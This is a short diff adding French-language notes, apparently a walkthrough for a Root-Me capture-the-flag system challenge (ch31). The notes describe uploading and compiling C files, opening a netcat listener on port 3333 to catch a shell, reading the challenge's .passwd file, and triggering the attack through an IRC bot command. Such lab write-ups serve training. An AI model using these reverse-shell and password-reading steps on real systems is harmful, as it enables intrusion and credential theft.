@@ -1,0 +1,19 @@
+ouverture de 2 terminaux ssh + un terminal pour le scp et 1 navigateur sur wsirc.com irc.root-me.org:6667
+
+terminal pour le scp :
+scp de tous les fichiers *.c *.h vers le distant dans /tmp/funky
+
+terminal 1 :
+mkdir /tmp/funky
+cd /tmp/funky
+gcc *.c *.h && ./a.out
+
+terminal 2 :
+nc -v -l -p 3333
+cd /challenge
+cd app-systeme
+cd ch31
+cat .passwd
+
+navigateur :
+envoyer un message privée à notre bot custom : !exploit Pown3dBot
